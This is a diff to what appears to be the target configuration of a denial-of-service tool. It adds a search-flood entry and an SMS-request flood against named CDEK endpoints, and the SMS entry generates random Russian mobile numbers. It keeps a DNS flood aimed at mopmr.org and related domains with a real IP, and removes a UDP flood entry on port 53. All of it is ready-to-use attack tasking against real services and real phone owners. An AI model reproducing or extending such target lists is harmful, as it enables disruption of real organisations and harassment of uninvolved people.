@@ -4,6 +4,44 @@
         "page": "https://qiwi.com"
     },
     {
+        "method": "get",
+        "name": "CDEK (search engine)",
+        "page": "https://www.cdek.ru/ru/search?searchid=2353167&text=%%%text%%%&web=0",
+        "randomGenerators": [
+            {
+                "type": "string",
+                "name": "text",
+                "minLength": 3,
+                "maxLength": 15
+            }
+        ]
+    },
+    {
+        "method": "post",
+        "name": "CDEK SMS",
+        "page": "https://www.cdek.ru/graphql",
+        "body": "{\"operationName\":\"SendCode\",\"variables\":{\"input\":{\"locale\":\"ru\",\"websiteId\":\"ru\",\"phone\":\"+7%%%operator%%%%%%phone%%%\",\"token\":null}},\"query\":\"mutationSendCode($input:CdekIdLoginInputPhone){\\nSendCode(input:$input){\\nsuccess\\ndata\\nerrors{\\nmessage\\ncode\\n__typename\\n}\\n__typename\\n}\\n}\\n\"}",
+        "randomGenerators": [
+            {
+                "type": "enum",
+                "name": "operator",
+                "values": [
+                    910, 915, 916, 917, 919, 985, 986,
+                    903, 905, 906, 909, 962, 963, 964, 965, 966, 967, 968, 969, 980, 983, 986,
+                    925, 926, 929, 936, 999,
+                    901, 958, 977, 999,
+                    995, 996, 999
+                ]
+            },
+            {
+                "type": "integer",
+                "name": "phone",
+                "minValue": 1000000,
+                "maxValue": 9999999
+            }
+        ]
+    },
+    {
         "method": "dns_flood",
         "name": "mopmr.org",
         "ip": "176.99.13.12",
@@ -15,10 +53,5 @@
             "mfa-pmr.org",
             "vspmr.org"
         ]
-    },
-    {
-        "method": "udp_flood",
-        "ip": "95.173.128.77",
-        "port": 53
     }
 ]
